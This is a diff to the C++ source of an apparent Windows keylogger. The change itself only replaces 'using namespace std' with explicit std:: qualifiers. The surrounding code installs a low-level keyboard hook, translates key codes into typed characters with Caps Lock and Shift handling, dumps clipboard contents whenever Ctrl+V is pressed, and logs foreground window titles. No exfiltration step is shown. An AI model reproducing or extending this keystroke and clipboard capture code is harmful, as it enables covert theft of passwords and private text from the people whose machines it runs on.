@@ -5,8 +5,6 @@
 #include <sstream>
 #include <iostream>
 #include <cstdio>
-using namespace std;
-
 
 HHOOK hKeyboardHook;
 int isCaps = 0;
@@ -17,10 +15,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	unsigned int vCode[61] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
 	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x6A, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0xBC, 0xBD, 0xC0, 0xBE, 0xBB,
 	0x08, 0x0D, 0x20, 0xDE, 0xBF, 0xDB, 0xDD, 0xBA, 0x09};
-	string lowCase[61] = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
+	std::string lowCase[61] = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
 	"t", "u", "v", "w", "x", "y", "z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ",", "-", "`", ".", "=", "\b \b", "[ENTER] \n", " ", "'", "/", "[", "]", ";",
 	"[TAB] \t"};
-	string upCase[61] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
+	std::string upCase[61] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
 	"T", "U", "V", "W", "X", "Y", "Z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "<", "_", "~", ">", "+", "\b \b", "[ENTER] \n", " ", "\"", "?", "{", "}", ":",
 	"[TAB] + [SHIFT] \t" };
 
@@ -30,7 +28,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
 			{
-				cout << " [CAPS OFF] ";
+				std::cout << " [CAPS OFF] ";
 				isCaps = 0;
 			}
 		}
@@ -38,7 +36,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
 			{
-				cout << " [CAPS ON] ";
+				std::cout << " [CAPS ON] ";
 				isCaps = 1;
 			}
 		}		
@@ -55,26 +53,26 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				if (isCaps == 1)
 				{
 					if (GetAsyncKeyState(VK_SHIFT) >= 0)
-						cout << upCase[i];
+						std::cout << upCase[i];
 					else
-						cout << lowCase[i];
+						std::cout << lowCase[i];
 				}
 				else
 				{
 					if (GetAsyncKeyState(VK_SHIFT) >= 0)
-						cout << lowCase[i];
+						std::cout << lowCase[i];
 					else
-						cout << upCase[i];
+						std::cout << upCase[i];
 				}
 
 				if ((GetAsyncKeyState(VK_CONTROL) != 0) && p->vkCode == 0x56)
 				{
-					cout << "\b \b";
+					std::cout << "\b \b";
 
 					if (!OpenClipboard(NULL))
-						cout << "Can't open clipboard" << endl;
+						std::cout << "Can't open clipboard" << std::endl;
 
-					cout << "\n[CLIPBOARD PASTE]:\n";
+					std::cout << "\n[CLIPBOARD PASTE]:\n";
 
 					HANDLE h = GetClipboardData(CF_TEXT);
 
@@ -83,7 +81,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 					CloseClipboard();
 				}
 				else if((GetAsyncKeyState(VK_CONTROL) != 0))
-					cout << "\b \b[Control] + " << lowCase[i] << "\n";
+					std::cout << "\b \b[Control] + " << lowCase[i] << "\n";
 			}
 		}
 
@@ -98,8 +96,8 @@ VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, H
 	char* winTitle = getWindowTitle();
 	if (dwEvent == EVENT_SYSTEM_FOREGROUND)
 	{
-		cout << "\n[WINDOW CHANGE]\n";
-		cout << winTitle << endl << endl;
+		std::cout << "\n[WINDOW CHANGE]\n";
+		std::cout << winTitle << std::endl << std::endl;
 	}
 	free(winTitle);
 }
